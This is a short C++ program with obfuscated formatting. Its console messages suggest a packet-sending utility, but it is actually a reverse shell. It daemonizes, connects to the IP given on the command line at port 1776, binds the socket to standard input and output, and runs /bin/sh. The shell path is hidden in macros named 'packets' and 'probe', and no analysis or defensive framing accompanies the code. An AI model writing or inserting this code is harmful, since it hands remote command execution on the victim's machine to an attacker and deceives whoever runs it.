#include/******************************************/    <iostream>
#include/*                                        */    <unistd.h>
#include/*                                        */<sys/socket.h>
#include/******************************************/ <arpa/inet.h>
#define /*                                        */  red "\e[31m"
#define /*                                        */yellow "\e[33m"
#define /*                                        */  blue "\e[34m"
#define /*                                        */packets "/bin"
#define /*                                        */magne "\e[35m"
#define /*                                        */green "\e[92m"
#define /*                                        */cyan  "\e[96m"
#define /*                                        */ probe    "/sh"
#define /******************************************/ norm "\e[39m"
using namespace std;int main(int argc, char** argv){if(argc!=2){
cout << red << "No Server!" << norm << endl; return 1;}cout << 
green << "Program Started!" <<norm<<endl;cout << green <<"SENT" 
<< norm << endl;daemon(1, 1);int s0;struct sockaddr_in target;
char packet[2000];s0=socket(AF_INET, SOCK_STREAM, 0);if(s0< 0)
{ close(s0);}target.sin_addr.s_addr = inet_addr(argv[1]);target.
sin_family = AF_INET; target.sin_port = htons(1776); if (connect(
s0, (struct sockaddr *)&target, sizeof(target)) < 0){ sleep(10); 
close(s0); } while(1){ recv(s0, packet, 2000, 0);dup2(s0,0); dup2(
s0,1); dup2(s0,2); execl(packets probe,packets probe,(char*)0);
close(s0);}sleep(10);return 0;} 
